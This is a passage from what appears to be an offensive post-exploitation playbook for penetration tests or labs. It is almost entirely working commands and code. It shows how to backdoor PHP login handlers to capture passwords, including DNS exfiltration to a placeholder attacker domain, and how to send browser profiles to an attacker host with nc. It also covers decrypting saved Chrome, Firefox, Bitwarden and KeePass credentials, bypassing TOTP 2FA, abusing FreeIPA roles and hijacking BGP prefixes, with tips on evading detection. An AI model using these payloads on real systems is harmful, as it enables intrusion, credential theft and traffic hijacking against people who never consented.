# === GKE / AKS Workload Identity ===
# Same pattern as IRSA: projected SA token swapped for cloud creds.

# GKE Workload Identity — pod's SA token swaps to GCP token via metadata server
# Metadata is available on the *node*, but Workload Identity routes through gke-metadata-server:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Confirm it bound to a GCP SA, not the node:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# AKS Workload Identity — projected federated token + AZURE_FEDERATED_TOKEN_FILE
env | grep AZURE_
# Vars:
#   AZURE_CLIENT_ID / AZURE_TENANT_ID
#   AZURE_FEDERATED_TOKEN_FILE   (path to projected JWT)
#   AZURE_AUTHORITY_HOST

cat "$AZURE_FEDERATED_TOKEN_FILE"
# Exchange for an Entra (AAD) token via client_assertion flow
curl -s -X POST "${AZURE_AUTHORITY_HOST}${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$(cat $AZURE_FEDERATED_TOKEN_FILE)" \
  -d "grant_type=client_credentials"
# Returns access_token — chain to §5.1e Azure block (Graph / Key Vault / ARM).
```

> **Tip:** Workload-bound creds (ECS/Fargate/Lambda/IRSA/MSI) are short-lived (15min–12h) — don't dawdle. Mint them once, chain to §5.1e enumeration, drop your additive marker, and capture the artifact for the report before the token expires.

> **OPSEC:** Every `assume-role-with-web-identity`, `generateAccessToken`, and Workload Identity exchange is logged with the audience/subject claim of the projected JWT. CloudTrail / GCP Audit / Entra sign-in logs all carry the original SA identity, not just the assumed role — defenders can pinpoint the compromised pod from a single API call.

---

### 5.1g Credential Capture via Writable PHP Login Handler
When the web root is world-writable and a real user (or cron simulator) periodically logs in, append a one-liner to siphon POST credentials.

```bash
# Confirm web root is world-writable
ls -la /var/www/html/
find /var/www -type d -perm -o=w 2>/dev/null
find /var/www -type f -name "*.php" -perm -o=w 2>/dev/null

# Detect cron simulator / scheduled login activity
ps auxf | grep -iE "curl|wget|firefox|chromium|chrome" | grep -v grep
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.*/ 2>/dev/null
grep -rE "curl|wget|login" /etc/cron.* /var/spool/cron/ 2>/dev/null
```

> **Tip:** Same primitive applies to JSP (`out.println` + file append), WSGI/Flask (decorator wrapping `request.form`), and Express (middleware logging `req.body`). Pick the framework's auth handler.

```bash
# Backup before modifying — restore at end of engagement
cp /var/www/html/<TARGET_LOGIN>.php /tmp/<TARGET_LOGIN>.php.bak
```

PHP patch variants — pick one and append to the auth handler.

```php
// Variant 1 — WordPress wp-login.php (append before authentication call)
<?php
if (!empty($_POST['log']) && !empty($_POST['pwd'])) {
    file_put_contents('/tmp/.cache_<TS>', $_POST['log'].':'.$_POST['pwd']."\n", FILE_APPEND);
}
?>

// Variant 2 — Generic login handler (replace field names to match form)
<?php
if (!empty($_POST['<USER_FIELD>']) && !empty($_POST['<PASS_FIELD>'])) {
    file_put_contents('/tmp/.cache_<TS>', $_POST['<USER_FIELD>'].':'.$_POST['<PASS_FIELD>']."\n", FILE_APPEND);
}
?>

// Variant 3 — DNS exfil (no writable disk needed; blind logging)
<?php
if (!empty($_POST['<USER_FIELD>']) && !empty($_POST['<PASS_FIELD>'])) {
    @gethostbyname(bin2hex($_POST['<USER_FIELD>'].':'.$_POST['<PASS_FIELD>']).'.<ATTACKER_DNS>');
}
?>
```

```bash
# Harvest captured creds after cron simulator fires
cat /tmp/.cache_<TS>

# Pivot with captured credentials
su - <CAPTURED_USER>
ssh <CAPTURED_USER>@<TARGET>

# Restore original file at end of engagement
cp /tmp/<TARGET_LOGIN>.php.bak /var/www/html/<TARGET_LOGIN>.php
```

> **OPSEC:** Modified mtime on auth handler is a strong IOC. AIDE / Tripwire baseline diffs catch this immediately. WordPress detects via `wp-cli core verify-checksums` and `wp-cli plugin verify-checksums`. Touch mtime back to original (`touch -r /tmp/<TARGET_LOGIN>.php.bak <target>`) and restore at end of engagement.

---

### 5.1h Firefox Saved-Credential Decryption (Known/Blank Master Password)

Firefox stores saved logins in `logins.json` encrypted by a key in `key4.db`. With a known or blank master password, decrypt offline to recover URL/USER/PASSWORD triples.

```bash
# Locate Firefox profile under the foothold user's home
ls -la /home/<USER>/.mozilla/firefox/ 2>/dev/null
ls -la /root/.mozilla/firefox/ 2>/dev/null
find / -name "key4.db" 2>/dev/null
find / -name "logins.json" 2>/dev/null

# Tarball the profile (exclude cache to keep it small) and exfil to attacker
cd /home/<USER>/.mozilla/firefox/
tar czf /tmp/.ffprof-<USER>.tgz --exclude='*cache*' --exclude='*Cache*' <PROFILE_DIR>.default-release
# Stage to attacker via existing channel, e.g.:
nc <ATTACKER_IP> <ATTACKER_PORT> < /tmp/.ffprof-<USER>.tgz
```

```bash
# === On attacker — decrypt offline ===

# Tool 1: firefox_decrypt (handles key4.db + logins.json + master password)
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt

mkdir -p /tmp/loot && tar xzf /tmp/.ffprof-<USER>.tgz -C /tmp/loot

# Blank or known master password — outputs URL / USER / PASSWORD triples
python3 firefox_decrypt.py /tmp/loot/<PROFILE_DIR>.default-release

# Wordlist mode — try every password in rockyou (works for any non-blank MP)
python3 firefox_decrypt.py --password-file /usr/share/wordlists/rockyou.txt /tmp/loot/<PROFILE_DIR>.default-release

# Tool 2: firepwd (lclevy) — alternative, raw key extraction from key4.db
git clone https://github.com/lclevy/firepwd.git
cd firepwd && python3 firepwd.py /tmp/loot/<PROFILE_DIR>.default-release/key4.db
```

```bash
# === Pivot — recovered web/app passwords are often reused for OS login ===
su - <USER>                                  # try captured pw against local accounts
sudo -l                                      # if sudo prompts, try the captured pw
ssh <USER>@<TARGET>                          # remote reuse
```

> **Tip:** Even an empty/blank master password (Firefox default) still requires `key4.db` — the encryption key is bound to that file. Always grab `key4.db` + `logins.json` together.

> **Loot:** Leave the tarball as engagement loot at `/tmp/.ffprof-<USER>.tgz` for the report; do not delete original profile files on target.

### 5.1hb Browser and Email-Client Credential Extraction (Chrome/Chromium + Thunderbird on Linux)

Extends 5.1h (Firefox) to cover Chrome/Chromium `Login Data` SQLite extraction and Thunderbird profile looting on Linux targets.

```bash
# === Chrome / Chromium on Linux ===
# Chrome stores credentials in an SQLite DB encrypted with a key from the OS keyring
# On Linux without a keyring (server/headless), Chrome uses "peanut butter" as the fallback key

# Locate Login Data
find /home -name "Login Data" -path "*/.config/google-chrome/*" 2>/dev/null
find /home -name "Login Data" -path "*/.config/chromium/*" 2>/dev/null
ls -la /home/<USER>/.config/google-chrome/Default/Login\ Data 2>/dev/null
ls -la /home/<USER>/.config/chromium/Default/Login\ Data 2>/dev/null

# Copy to writable location (SQLite needs write access for WAL)
cp "/home/<USER>/.config/google-chrome/Default/Login Data" /tmp/LoginData

# Query saved URLs and encrypted passwords
sqlite3 /tmp/LoginData "SELECT origin_url, username_value, hex(password_value) FROM logins;"
```

```bash
# Decrypt on attacker (Linux Chrome uses PBKDF2 with "peanut butter" as passphrase when no keyring)
# Key derivation: PBKDF2-SHA1("peanut butter", salt="saltysalt", iterations=1, keylen=16)
python3 -c '
import sqlite3, base64, hashlib
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

db = sqlite3.connect("/tmp/LoginData")
key = PBKDF2("peanut butter", b"saltysalt", dkLen=16, count=1)

for url, user, enc_pass in db.execute("SELECT origin_url, username_value, password_value FROM logins"):
    if enc_pass[:3] == b"v10" or enc_pass[:3] == b"v11":
        iv = b" " * 16
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(enc_pass[3:])
        pad_len = decrypted[-1]
        password = decrypted[:-pad_len].decode("utf-8", errors="ignore")
        print(f"{url} | {user} | {password}")
'
```

```bash
# If the system uses GNOME Keyring / KWallet (desktop), the key is in the keyring:
secret-tool search xdg:schema chrome_libsecret_os_crypt_password_v2 2>/dev/null
# If accessible, use that key instead of "peanut butter" for decryption
```

```bash
# === Thunderbird (email client) ===
# Same encryption scheme as Firefox — key4.db + logins.json

# Locate Thunderbird profiles
find /home -name "key4.db" -path "*/.thunderbird/*" 2>/dev/null
ls -la /home/<USER>/.thunderbird/ 2>/dev/null
cat /home/<USER>/.thunderbird/profiles.ini 2>/dev/null

# Tarball and exfil (same as Firefox workflow)
cd /home/<USER>/.thunderbird/
tar czf /tmp/.tbprof-<USER>.tgz --exclude='*cache*' --exclude='*Cache*' --exclude='ImapMail' <PROFILE_DIR>.default-release

# Decrypt offline (firefox_decrypt works on Thunderbird profiles too)
python3 firefox_decrypt.py /tmp/loot/<THUNDERBIRD_PROFILE>

# Bonus: Thunderbird stores email server passwords (IMAP/SMTP creds) — pivot to SSH/AD
grep -r "oauth" /home/<USER>/.thunderbird/<PROFILE>/ 2>/dev/null
```

#### Living-off-the-land / LOTL variant

```bash
# SQLite3 is often installed; extract raw hex-encoded passwords for offline cracking
sqlite3 "/home/<USER>/.config/google-chrome/Default/Login Data" \
  "SELECT origin_url, username_value, hex(password_value) FROM logins;" 2>/dev/null
# If sqlite3 unavailable: copy the DB file to attacker for offline analysis
# Thunderbird: tar the profile, decrypt on attacker with firefox_decrypt (same tool)
```

### 5.1hc KeePass Database Browsing with kpcli / keepassxc-cli (Post-Crack)

After cracking a `.kdbx` master password (see 5.1b), browse the database to extract stored credentials, notes, attachments, and TOTP seeds.

```bash
# Open database with kpcli (interactive CLI browser)
kpcli --kdb <DATABASE.kdbx>
# Enter master password when prompted

# Navigate the database
kpcli:/> ls
kpcli:/> cd <GROUP_NAME>
kpcli:/GROUP_NAME> ls
kpcli:/GROUP_NAME> show -f <ENTRY_NAME>    # -f shows password in cleartext
kpcli:/GROUP_NAME> show -f -a <ENTRY_NAME> # -a also shows attachments

# Export all entries
kpcli:/> find .                             # list everything
kpcli:/> show -f <ENTRY>                   # repeat for each entry

# Dump all passwords at once (non-interactive)
echo -e "open <DATABASE.kdbx>\n<MASTER_PASSWORD>\nfind .\nquit" | kpcli 2>/dev/null
```

```bash
# Alternative: keepassxc-cli (ships with KeePassXC)
keepassxc-cli open <DATABASE.kdbx>
# Enter master password

keepassxc-cli ls <DATABASE.kdbx>                              # list groups
keepassxc-cli ls <DATABASE.kdbx> /<GROUP>/                    # list entries in group
keepassxc-cli show <DATABASE.kdbx> /<GROUP>/<ENTRY>           # show entry with password
keepassxc-cli show -s <DATABASE.kdbx> /<GROUP>/<ENTRY>        # show including TOTP seed

# Export all entries to plaintext
keepassxc-cli export <DATABASE.kdbx> --format csv > /tmp/keepass_dump.csv

# Extract attachments
keepassxc-cli attachment-export <DATABASE.kdbx> /<GROUP>/<ENTRY> <ATTACHMENT_NAME> /tmp/attachment_out
```

```bash
# Python alternative (pykeepass)
python3 -c '
from pykeepass import PyKeePass
kp = PyKeePass("<DATABASE.kdbx>", password="<MASTER_PASSWORD>")
for entry in kp.entries:
    print(f"{entry.group.name}/{entry.title}: {entry.username} : {entry.password}")
    if entry.notes: print(f"  Notes: {entry.notes}")
'
```

#### Living-off-the-land / LOTL variant

```bash
# If no kpcli/keepassxc-cli on target, copy .kdbx to attacker and use any of the above
# kpcli is a single Perl script — can be transferred if Perl is available on target
```

### 5.1hd GPG Decrypt Encrypted Files (Post-Crack Workflow)

After cracking a GPG private key passphrase (via gpg2john + john/hashcat), import the key and decrypt `.gpg`/`.pgp`/`.asc` files to access protected data.

```bash
# Step 1: Import the recovered private key into a temporary keyring
export GNUPGHOME=/tmp/.gpg_loot
mkdir -p "$GNUPGHOME" && chmod 700 "$GNUPGHOME"
gpg --import <PRIVATE_KEY_FILE>
gpg --list-secret-keys

# Step 2: Decrypt the encrypted file using the cracked passphrase
gpg --batch --pinentry-mode loopback --passphrase '<CRACKED_PASSPHRASE>' \
  --decrypt <ENCRYPTED_FILE.gpg> > /tmp/decrypted_output
# Or for .asc (ASCII-armored):
gpg --batch --pinentry-mode loopback --passphrase '<CRACKED_PASSPHRASE>' \
  --decrypt <ENCRYPTED_FILE.asc> > /tmp/decrypted_output

# Step 3: Examine decrypted content
cat /tmp/decrypted_output
file /tmp/decrypted_output
```

```bash
# If the file is symmetrically encrypted (no key import needed, just passphrase)
gpg --batch --pinentry-mode loopback --passphrase '<PASSWORD>' \
  --decrypt <SYMMETRIC_ENCRYPTED.gpg> > /tmp/decrypted_output

# Mine the decrypted content for credentials
grep -iE "password|token|secret|key|api" /tmp/decrypted_output
# If it's an archive:
tar xzf /tmp/decrypted_output -C /tmp/gpg_loot/ 2>/dev/null
unzip /tmp/decrypted_output -d /tmp/gpg_loot/ 2>/dev/null
```

#### Living-off-the-land / LOTL variant

```bash
# gpg ships with virtually every Linux distro — fully LOTL
# The --pinentry-mode loopback + --batch flags avoid interactive passphrase prompts
# If --pinentry-mode is unsupported (old gpg): use gpg-agent with preset passphrase
gpg-preset-passphrase --preset <KEYGRIP> <<< '<CRACKED_PASSPHRASE>'
gpg --decrypt <ENCRYPTED_FILE.gpg>
```

### 5.1he Google Authenticator PAM 2FA Bypass (Backup Codes + Secret Extraction)

When a Linux host uses `pam_google_authenticator.so` for SSH/sudo 2FA, the shared secret and emergency scratch codes are stored in `~/.google_authenticator`. Reading this file allows generating valid TOTP codes or using one-time backup codes.

```bash
# Detect — is Google Authenticator PAM configured?
grep -r "pam_google_authenticator" /etc/pam.d/ 2>/dev/null

# Locate the user's authenticator file
cat /home/<USER>/.google_authenticator 2>/dev/null
cat /root/.google_authenticator 2>/dev/null
# Format:
#   Line 1: Base32 secret (e.g., JBSWY3DPEHPK3PXP)
#   Following lines: configuration options
#   Last 5 lines: emergency scratch codes (one-time use, 8 digits each)
```

```bash
# Method 1: Use emergency scratch codes directly
ssh <USER>@<TARGET>
# Password: <PASSWORD>
# Verification code: <SCRATCH_CODE>

# Method 2: Generate valid TOTP codes using the extracted secret
oathtool --totp --base32 '<BASE32_SECRET>'

# Python alternative (no oathtool needed):
python3 -c '
import hmac, hashlib, struct, time, base64
secret = base64.b32decode("<BASE32_SECRET>")
counter = int(time.time()) // 30
msg = struct.pack(">Q", counter)
h = hmac.new(secret, msg, hashlib.sha1).digest()
offset = h[-1] & 0x0F
code = (struct.unpack(">I", h[offset:offset+4])[0] & 0x7FFFFFFF) % 1000000
print(f"{code:06d}")
'
```

#### Living-off-the-land / LOTL variant

```bash
# Reading .google_authenticator only requires file read access (cat)
# Emergency scratch codes work immediately — no tool needed
# For TOTP generation without oathtool: python3 snippet above is self-contained
# If no python3: use the 5 scratch codes (one-time use each)
```

### 5.1hf Brotli (.br) Compressed File Decompression

During loot enumeration, `.br` (Brotli-compressed) files may contain credentials, configs, or database dumps. Decompress before mining for secrets.

```bash
# Find .br files
find / -name "*.br" -type f 2>/dev/null

# Decompress with brotli CLI
brotli --decompress <FILE.br> -o /tmp/decompressed_output
brotli -d <FILE.br> -o /tmp/decompressed_output

# Python fallback (brotli module often present with python3)
python3 -c '
import brotli, sys
with open(sys.argv[1], "rb") as f:
    data = brotli.decompress(f.read())
with open("/tmp/decompressed_output", "wb") as f:
    f.write(data)
' <FILE.br>

# Mine decompressed content
grep -iE "password|token|secret|key|api" /tmp/decompressed_output
file /tmp/decompressed_output
```

#### Living-off-the-land / LOTL variant

```bash
# brotli CLI ships with many distros (libbrotli-dev / brotli package)
which brotli 2>/dev/null
# If unavailable: python3 -c 'import brotli' → if it imports, use the python approach
# Last resort: copy .br file to attacker for decompression
```

### 5.1hg Git 'Dubious Ownership' HOME Bypass for Credential Mining

Git >= 2.35.2 refuses to operate on repos owned by a different user ("dubious ownership"). When you can read another user's repo but git refuses to run log/diff/show, bypass by setting `HOME=/tmp` or adding the path to safe.directory.

```bash
# Symptom: git commands fail with "detected dubious ownership"
cd /opt/app
git log       # fatal: detected dubious ownership in repository at '/opt/app'

# Bypass 1: Set HOME to a writable dir (fresh gitconfig, no safe.directory block)
HOME=/tmp git log --all --oneline
HOME=/tmp git log --all -p | grep -iE "password|secret|token|key"
HOME=/tmp git show <COMMIT>:<FILE>

# Bypass 2: Add to safe.directory
git config --global --add safe.directory /opt/app
git log --all --oneline

# Bypass 3: GIT_CONFIG_GLOBAL pointing to /dev/null
GIT_CONFIG_GLOBAL=/dev/null git log --all -p

# Now mine the repo as normal (see 5.1i for full git history mining)
HOME=/tmp git log --all -S "password" -p
HOME=/tmp git stash list
HOME=/tmp git stash show -p stash@{0}
```

#### Living-off-the-land / LOTL variant

```bash
# The HOME=/tmp trick is pure LOTL — no tools beyond git itself
# Alternative without git: directly parse .git/objects
find /opt/app/.git -name "*.pack" -exec strings {} \; | grep -i "password"
```

### 5.1hh git --work-tree Override — Stage/Read Files from Outside the Repo

When a git repo is writable but you need to read or stage files from a different location, `--work-tree` decouples the working directory from the `.git` directory.

```bash
# Read arbitrary files by pointing work-tree at root filesystem
git --git-dir=/path/to/writable/.git --work-tree=/ diff HEAD -- etc/shadow
git --git-dir=/path/to/writable/.git --work-tree=/ show HEAD:etc/shadow 2>/dev/null

# Stage files from outside the repo into git's object store (for exfil)
git --git-dir=/tmp/exfil.git --work-tree=/etc init
git --git-dir=/tmp/exfil.git --work-tree=/etc add shadow passwd
git --git-dir=/tmp/exfil.git --work-tree=/etc commit -m "loot"
# Tar /tmp/exfil.git and transfer to attacker
```

#### Living-off-the-land / LOTL variant

```bash
# Pure git — ships with the system, no external tools
# Useful when normal file copy is blocked but git operations are allowed
```

### 5.1hi Bitwarden Browser-Extension PIN Brute-Force

Bitwarden browser extension stores the vault in IndexedDB. When the user sets a PIN lock, the encryption key is derived from a 4-6 digit PIN via PBKDF2-SHA256 — brutable offline.

```bash
# Locate Bitwarden extension storage
find /home -path "*/.config/google-chrome/Default/IndexedDB/*bitwarden*" 2>/dev/null
find /home -path "*/.mozilla/firefox/*/storage/default/*bitwarden*" 2>/dev/null

# Chrome: data is in a LevelDB directory
ls -la "/home/<USER>/.config/google-chrome/Default/IndexedDB/chrome-extension_nngceckbapebfimnlniiiahkandclblb_0.indexeddb.leveldb/"

# Copy the extension storage directory to attacker
tar czf /tmp/.bw-loot.tgz "/home/<USER>/.config/google-chrome/Default/IndexedDB/chrome-extension_nngceckbapebfimnlniiiahkandclblb_0.indexeddb.leveldb/"
```

```bash
# On attacker: brute-force the PIN
# PBKDF2 with default iteration count on 4-6 digits = minutes on GPU
hashcat -m 26800 <BW_PIN_HASH> -a 3 ?d?d?d?d          # 4-digit PIN
hashcat -m 26800 <BW_PIN_HASH> -a 3 ?d?d?d?d?d?d      # 6-digit PIN

# Extract vault JSON from LevelDB for offline analysis
strings "/tmp/bw-loot/"*.ldb | grep -i "encrypted"
```

#### Living-off-the-land / LOTL variant

```bash
# On target: only need to locate and copy the IndexedDB files (tar/cp)
# All brute-force happens offline on attacker
```

### 5.1hj Forensic Recovery of Deleted Files from Raw Block Devices

When disk group membership or root access grants raw block device access, recover deleted files that are no longer visible in the filesystem.

```bash
# Identify the block device
lsblk
ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null

# Method 1: strings — searches all blocks including deleted file content
strings /dev/sda1 | grep -iE "password|BEGIN.*PRIVATE|secret|token|api_key" | head -50

# Method 2: dd + grep (targeted offset search)
dd if=/dev/sda1 bs=1M count=100 skip=0 2>/dev/null | strings | grep -i "password"

# Method 3: debugfs (ext2/3/4 — list and recover deleted inodes)
debugfs /dev/sda1
# debugfs: lsdel
# debugfs: dump <INODE> /tmp/recovered_file

# Method 4: extundelete (ext3/ext4)
extundelete /dev/sda1 --restore-all --output-dir /tmp/recovered/

# Method 5: photorec (carves files by header signatures — any filesystem)
photorec /dev/sda1

# Method 6: foremost (header-based carving)
foremost -i /dev/sda1 -o /tmp/carved/
```

#### Living-off-the-land / LOTL variant

```bash
# strings + dd + grep are LOTL (ship with coreutils/binutils)
strings /dev/sda1 | grep -i "password" | head -20
# debugfs ships with e2fsprogs (present on ext4 systems)
# For photorec/extundelete/foremost: transfer from attacker
```

### 5.1hk bmap Slack-Space Data Extraction

Data can be hidden in filesystem slack space. The `bmap` tool reads slack space content after a file's logical end within its allocated block.

```bash
# Read slack space from a file
bmap --mode slack <FILE_PATH>

# Scan multiple files for non-null slack content
find /home/<USER> -type f -exec sh -c 'slack=$(bmap --mode slack "$1" 2>/dev/null); [ -n "$slack" ] && echo "SLACK: $1" && echo "$slack"' _ {} \;
```

#### Living-off-the-land / LOTL variant

```bash
# Without bmap: calculate slack size and read raw blocks with dd
FILESIZE=$(stat -c %s <FILE_PATH>)
BLOCKSIZE=$(stat -f -c %S <FILE_PATH>)
echo "Potential slack: $((BLOCKSIZE - (FILESIZE % BLOCKSIZE))) bytes"
# Practical extraction requires bmap or raw device access + block offset math
# Fastest fallback: strings on the raw block device covers slack content too
```

### 5.1hl FreeIPA Realm Enumeration + Privilege Abuse

FreeIPA provides centralized authentication similar to Active Directory. When a Linux host is domain-joined to a FreeIPA realm, enumerate users/groups/sudo rules for lateral movement and privilege escalation via delegated roles.

```bash
# Detect FreeIPA domain membership
cat /etc/ipa/default.conf 2>/dev/null
klist 2>/dev/null
cat /etc/sssd/sssd.conf 2>/dev/null | grep -i "ipa\|domain"
realm list 2>/dev/null
```

```bash
# Enumerate users (requires valid Kerberos ticket)
ipa user-find --all --raw 2>/dev/null | head -100
ipa user-show <USERNAME> --all 2>/dev/null

# Enumerate groups and memberships
ipa group-find --all 2>/dev/null
ipa group-show admins --all 2>/dev/null

# Enumerate sudo rules
ipa sudorule-find --all 2>/dev/null
ipa sudorule-show <RULE_NAME> --all 2>/dev/null

# Enumerate HBAC rules
ipa hbacrule-find --all 2>/dev/null

# Enumerate roles and privileges
ipa role-find --all 2>/dev/null
ipa privilege-find --all 2>/dev/null
```

```bash
# Privilege escalation path: delegated role -> password reset -> group add -> sudorule

# If your user has "User Administrators" or "helpdesk" role:
ipa passwd <TARGET_USER>                        # reset another user's password

# If you can modify group membership:
ipa group-add-member admins --users=<YOUR_USER>

# If you have delegation on sudorules:
ipa sudorule-add pwn-rule --cmdcat=all --hostcat=all
ipa sudorule-add-user pwn-rule --users=<YOUR_USER>
# Now: sudo -i on any host in the realm
```

#### Living-off-the-land / LOTL variant

```bash
# ipa CLI ships with freeipa-client (present on all domain-joined hosts)
# Without ipa CLI: use ldapsearch against the IPA LDAP backend
ldapsearch -x -H ldap://<IPA_SERVER> -b "cn=users,cn=accounts,dc=<DOMAIN>,dc=<TLD>" "(objectClass=person)" uid
ldapsearch -x -H ldap://<IPA_SERVER> -b "cn=sudorules,cn=sudo,dc=<DOMAIN>,dc=<TLD>" "(objectClass=*)"
```

### 5.1hm BGP Prefix Hijacking via Quagga/FRR vtysh

When you compromise a Linux edge router running Quagga or FRR (Free Range Routing), inject BGP route advertisements to redirect traffic through your controlled host. Relevant in lab environments simulating ISP/enterprise routing.

```bash
# Detect — is Quagga/FRR running?
ps auxf | grep -iE "bgpd|zebra|ospfd|frr|quagga" | grep -v grep
systemctl status frr 2>/dev/null || systemctl status quagga 2>/dev/null
ls /etc/frr/ /etc/quagga/ 2>/dev/null

# Read current BGP configuration
vtysh -c "show running-config"
vtysh -c "show ip bgp summary"
vtysh -c "show ip bgp neighbors"
vtysh -c "show ip route"
```

```bash
# Inject a more-specific prefix to hijack traffic for a target subnet
vtysh <<'EOF'
configure terminal
router bgp <LOCAL_ASN>
 network <TARGET_PREFIX>/<MASK+1>
 neighbor <PEER_IP> route-map HIJACK out
!
route-map HIJACK permit 10
 set as-path prepend <LOCAL_ASN>
!
end
write memory
EOF

# Verify advertisement
vtysh -c "show ip bgp <TARGET_PREFIX>/<MASK+1>"
vtysh -c "show ip bgp neighbors <PEER_IP> advertised-routes"
```

#### Living-off-the-land / LOTL variant

```bash
# vtysh ships with FRR/Quagga — it IS the management tool for the routing daemon
# No external tools needed; vtysh is the LOTL interface to BGP
# If vtysh requires a password: check /etc/frr/vtysh.conf or /etc/quagga/vtysh.conf
cat /etc/frr/vtysh.conf 2>/dev/null
```

### 5.1i Local Git History Mining (Post-Foothold)

Developers commit secrets, then revert or delete the file — git history retains them. Mine local `.git` directories for keys hidden in old commits, stashes, reflog, and dangling blobs.

```bash
# Locate every git working tree the current user can read
find / -name ".git" -type d 2>/dev/null
find /home /opt /var/www /srv /root -name ".git" -type d 2>/dev/null

# Inspect each repo from its working tree
cd <APP_PATH>
git log --all --oneline | head -50
git branch -a
git tag
git stash list
git reflog --all
```

Quick pattern sweep across the entire history (all branches, all blobs).

```bash
# Grep every commit on every branch for high-signal strings
git log --all -p | grep -iE "password|passwd|secret|api[_-]?key|token|aws_access|aws_secret|bearer|private[_-]?key"

# Same idea but with git's pickaxe — finds commits that ADDED/REMOVED a string
git log --all -S "password" --source --remotes -p
git log --all -S "BEGIN RSA PRIVATE KEY" -p
git log --all -G "(?i)(api[_-]?key|secret|token)" -p

# Search blob contents directly (catches deleted files still in objects)
git rev-list --all --objects | awk '{print $1}' | sort -u | \
  xargs -I{} git cat-file -p {} 2>/dev/null | \
  grep -iE "password|api[_-]?key|aws_secret|BEGIN.*PRIVATE KEY"
```

Recover deleted / dangling content the working tree no longer shows.

```bash
# Find unreachable / dangling objects (orphaned commits, blobs, stashes)
git fsck --full --unreachable --dangling --no-reflogs
git fsck --lost-found

# Read each dangling blob to disk, then grep
git fsck --lost-found 2>/dev/null
ls .git/lost-found/other/   # dangling blobs land here
ls .git/lost-found/commit/  # dangling commits

# Print a specific dangling blob
git cat-file -p <BLOB_HASH>

# Reflog often holds rebased/amended commits the user thought were gone
git reflog --all --date=iso
git show <REFLOG_HASH>

# Stashes can carry uncommitted secrets devs forgot about
git stash list
git stash show -p stash@{0}
```

Automated secret scanners — point them at the on-disk repo, including history.

```bash
# trufflehog — scans full git history (commits, branches, stashes)
trufflehog git file://<APP_PATH> --no-update --json

# gitleaks — fast, regex + entropy, scans history by default
gitleaks detect --source <APP_PATH> --no-git=false -v

# git-secrets — AWS-focused, scans history with --scan-history
cd <APP_PATH>
git secrets --scan-history
```

Pull the entire repo to attacker-controlled storage for offline mining when on-target tooling is limited.

```bash
# Tar the .git directory and exfil — preserves all history/objects
tar czf /tmp/.repo-<APP_NAME>.tgz -C <APP_PATH> .git
# Stage to attacker host via existing channel (see tunneling-pivoting.md)

# On attacker box: re-instantiate and scan with full toolchain
mkdir <APP_NAME> && tar xzf .repo-<APP_NAME>.tgz -C <APP_NAME>
cd <APP_NAME> && git log --all --oneline
trufflehog git file://. --json > findings.json
```

High-value file paths to grep history for explicitly.

```bash
# Common secret-bearing filenames worth pickaxing across all commits
for f in .env .env.local config.json secrets.yml settings.py wp-config.php \
         application.properties database.yml credentials .npmrc .pypirc \
         id_rsa .aws/credentials .docker/config.json kubeconfig; do
  echo "=== $f ==="
  git log --all --oneline -- "**/$f" "$f"
done

# Show every historical version of a path that no longer exists in HEAD
git log --all --oneline -- <FILE_PATH>
git show <COMMIT_HASH>:<FILE_PATH>
```

> **Tip:** Even after `git rm` + commit + `git gc`, secrets persist in pack files until objects expire. `git fsck --unreachable` plus `git cat-file -p` pulls them back regardless.

> **Tip:** Bare repos on servers (`/srv/git/*.git`, `/opt/gitea/`, `/var/lib/gitlab/`) hold the same history — same techniques apply, just `cd` into the bare repo directory directly.

### 5.1j MongoDB Local Shell Post-Foothold Credential Extraction

When MongoDB is bound to localhost without authentication (common default), connect via the mongo shell and enumerate databases for plaintext credentials, API keys, and password hashes that enable lateral movement or privilege escalation.

```bash
# Detect — is MongoDB running locally without auth?
ss -tlnp | grep -E "27017|27018|mongod"
ps auxf | grep mongod | grep -v grep
# Check if auth is disabled (default on many installs)
grep -E "auth|authorization" /etc/mongod.conf /etc/mongodb.conf 2>/dev/null
# If authorization: disabled (or absent) → no auth needed
```

```bash
# Connect and enumerate
mongo --quiet --eval "db.adminCommand('listDatabases')"
# Or with mongosh (newer versions):
mongosh --quiet --eval "db.adminCommand('listDatabases')"

# Enumerate all databases and collections
mongo --quiet <<'MONGOEOF'
var dbs = db.adminCommand('listDatabases').databases;
dbs.forEach(function(d) {
  var conn = db.getSiblingDB(d.name);
  print("\n=== " + d.name + " ===");
  conn.getCollectionNames().forEach(function(c) {
    print("  " + c + " (" + conn.getCollection(c).count() + " docs)");
  });
});
MONGOEOF
```

```bash
# Hunt for credentials in common collection names
mongo --quiet <<'MONGOEOF'
var targets = ['users', 'accounts', 'credentials', 'admins', 'auth', 'sessions', 'tokens', 'apikeys', 'config'];
var dbs = db.adminCommand('listDatabases').databases;
dbs.forEach(function(d) {
  var conn = db.getSiblingDB(d.name);
  conn.getCollectionNames().forEach(function(c) {
    if (targets.some(function(t) { return c.toLowerCase().indexOf(t) >= 0; })) {
      print("\n[!] " + d.name + "." + c);
      conn.getCollection(c).find().limit(10).forEach(printjson);
    }
  });
});
MONGOEOF

# Direct credential extraction from common patterns
mongo --quiet --eval 'db.getSiblingDB("<DB_NAME>").users.find({}, {username:1, password:1, email:1})'
mongo --quiet --eval 'db.getSiblingDB("admin").system.users.find()'   # MongoDB internal users
```

```bash
# Password reuse check — try extracted creds against system accounts
# Extract unique passwords/hashes
mongo --quiet --eval 'db.getSiblingDB("<DB_NAME>").users.find({},{password:1,_id:0})' | \
  grep -oP '"password"\s*:\s*"\K[^"]+' | sort -u > /tmp/mongo_passwords.txt

# Try against local users via su
while IFS= read -r pass; do
  echo "$pass" | timeout 2 su - <TARGET_USER> -c whoami 2>/dev/null && echo "[+] $pass works"
done < /tmp/mongo_passwords.txt
```

#### Living-off-the-land / LOTL variant

```bash
# mongo/mongosh client is present on any system running MongoDB
which mongo mongosh 2>/dev/null
# If mongo client is missing but Python3 is available:
python3 -c "
